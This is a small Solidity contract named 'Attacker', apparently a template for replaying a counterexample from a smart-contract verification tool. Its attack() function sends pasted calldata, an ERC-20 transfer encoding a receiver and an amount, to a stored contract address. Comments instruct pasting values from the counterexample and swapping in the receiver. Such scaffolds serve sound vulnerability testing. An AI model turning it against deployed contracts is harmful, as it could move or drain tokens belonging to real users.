// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

contract Attacker {
    mapping (uint256 => address) known_addresses;
    uint256 known_next_index = 0;

    function add_known_address(address known) public {
        known_addresses[known_next_index] = known;
        known_next_index++;
    }

    function attack() public {
        uint256 contract_index = 0x0000000000000000000000000000000000000000000000000000000000000000; // Contract index is not symbolic, just paste value from counterexample
        for (uint256 i = 0; i < known_next_index; i++) {
            if (i == contract_index) {
                address to_call = known_addresses[i];
                // Paste hex from counterxample here, but replace receiver address with the correct one
                bytes memory data = hex"a9059cbb0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b26400000000000000000000000000000000000000000000000003c723168ff988000000000000000000000000000000000000000000000000000000000000000000";
                (bool success, ) = to_call.call(data);
                if (!success) {
                    revert();
                }
            }
        }
    }
}